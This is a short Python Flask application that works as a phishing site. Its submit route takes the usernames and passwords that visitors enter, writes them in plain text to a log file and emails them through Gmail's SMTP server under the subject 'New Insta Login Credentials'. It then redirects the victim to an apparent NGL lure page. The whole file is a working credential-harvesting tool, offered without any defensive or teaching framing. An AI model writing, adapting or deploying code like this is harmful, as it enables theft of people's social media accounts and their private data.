from flask import Flask, render_template, request, redirect
import smtplib
import os

app = Flask(__name__)

# Email config from environment variables
EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    # Simple log file
    with open('visitors.log', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    # Send email with credentials
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            subject = 'New Insta Login Credentials'
            body = f'Username: {username}\nPassword: {password}'
            msg = f'Subject: {subject}\n\n{body}'
            smtp.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
    except Exception as e:
        print(f"Email send failed: {e}")

    # Redirect to local NGL page
    return redirect('/ngl')

@app.route('/ngl')
def ngl():
    return render_template('ngl.html')

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
   
